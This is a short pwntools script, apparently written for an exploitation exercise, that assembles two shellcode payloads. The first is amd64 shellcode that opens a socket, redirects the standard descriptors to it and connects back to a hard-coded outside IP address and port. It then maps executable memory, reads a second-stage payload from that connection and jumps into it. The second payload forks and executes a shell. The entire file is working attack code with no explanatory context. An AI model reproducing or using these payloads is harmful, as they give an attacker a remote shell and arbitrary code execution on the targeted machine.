from pwn import *
context.arch = 'amd64'
shellcode = '''
	xor rdx, rdx
	push 1
	pop rsi
	push 2
	pop rdi
	push 41
	pop rax
	syscall
	sub rsp, 8
	xchg rdi, rax
loop:
	mov al, 33
	syscall
	dec rsi
	jns loop
	push 0x3d974c34
	pushw 0x612d
	pushw 2
	mov rsi, rsp
	mov al, 42
	mov rdx, 16
	syscall

	mov rax, 9
	mov rdi, 0x800000
	mov rsi, 0x1000
	mov rdx, 7
	mov r10, 34
	mov r8, -1
	syscall
	xor rax, rax
	xor rdi, rdi
	mov rsi, 0x800000
	mov rdx, 1000
	syscall
	add rsi, 8
	jmp rsi
'''
rshell= asm(shellcode)
shellcode = '''
mov eax, 0x2
mov rdi, 0x800000
int 0x80
cmp eax, 0
je shell
loop:
test eax, eax
jmp loop
shell:
mov ebx, 0x800000
mov eax, 0xb
xor ecx, ecx
xor edx, edx
int 0x80
'''
shell = asm(shellcode)
